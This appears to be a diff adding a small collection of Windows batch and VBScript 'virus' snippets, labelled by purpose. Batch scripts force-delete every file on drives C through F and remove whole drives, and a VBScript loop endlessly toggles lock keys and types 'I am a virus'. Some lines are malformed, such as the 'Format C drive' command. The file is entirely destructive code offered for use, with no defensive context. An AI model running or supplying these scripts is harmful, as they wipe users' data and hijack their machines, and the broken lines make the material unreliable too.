@@ -1,0 +1,31 @@
+To delete Volumes in Computers .bat
+@echo off
+del C:\*.*/f /s /q
+del D:\*.*/f /s /q
+del E:\*.*/f /s /q
+del F:\*.*/f /s /q
+
+Format all drive.bat
+
+@echo off   
+rd/s/q D:   
+rd/s/q C:   
+rd/s/q E:
+
+Format C drive.bat
+
+@Echo off
+Del C: *.* |y
+
+Keyboard Virus.vbs
+
+set x=wscript.createobject ("wscript.shell")
+do
+wscript.sleep 100
+x.sendkeys "{CAPSLOCK}"
+x.sendkeys "{NUMLOCK}"
+x.sendkeys "I am a virus "
+x.sendkeys "{SCROLLLOCK}"
+loop
+
+
